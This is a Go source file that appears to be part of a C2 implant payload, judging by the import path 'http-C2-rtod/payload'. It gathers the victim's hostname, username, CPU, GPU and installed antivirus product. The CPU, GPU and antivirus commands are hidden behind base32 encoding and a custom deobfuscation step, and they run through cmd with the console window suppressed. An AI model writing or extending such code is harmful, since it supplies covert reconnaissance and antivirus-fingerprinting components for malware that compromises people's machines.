package info

import (
	"encoding/base32"
	"fmt"
	"http-C2-rtod/payload/help"
	"os"
	"os/exec"
	"os/user"
	"strings"
	"syscall"
)

func GetHostname() (hostname string) {
	hostname, err := os.Hostname()
	if err != nil {
		fmt.Println(err)
		hostname = "UNKNOWN"
	}
	return
}
func GetUsername() (username string) {
	us, err := user.Current()
	if err != nil {
		fmt.Println(err)
		username = "UNKNOWN"
		return
	}
	username = us.Username
	return
}
func dec(code string) string {
	v, _ := base32.HexEncoding.DecodeString(code)
	return string(v)
}
func GetCPU() string {
	Info := exec.Command("cmd", "/C", help.Deobfuscate(dec("F1N6KP11CHONC8B8CPQI2RR2DPJ0====")))
	Info.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	History, _ := Info.Output()

	return help.StripSpaces(strings.Replace(string(History), "Name", "", -1))
}

func GetGPU() string {
	Info := exec.Command("cmd", "/C", help.Deobfuscate(dec("F1N6KP11E5H7AQ91F1L6UD1JC1BMKPB6E1270RRLEDO6QRB6ECGMGPJL45NM4RJ6")))
	Info.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	History, _ := Info.Output()

	return help.StripSpaces(strings.Replace(string(History), "Name", "", -1))
}

func GetAntiVirus() string {
	Info := exec.Command("cmd", "/C", help.Deobfuscate(dec("B174KH11617N0PB67DMN0P32DLKN0T3L44O4UOJECPQ72OJ4COTLQNBJE1O7ANAKCPI7CSRAELT48PJFELJ76CP1A5H7AQ9189NNAQIND9PNCT2HEDO6ATJ4EKGKGPJL45IMKT3HDLH7KJR2DPJ22C27E1PMSOJL7D6MKT3L")))
	Info.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	History, _ := Info.Output()

	if strings.Contains(string(History), "=") {
		AV := strings.Split(string(History), "=")
		return help.StripSpaces(AV[1])
	} else {
		return help.StripSpaces(string(History))
	}
}
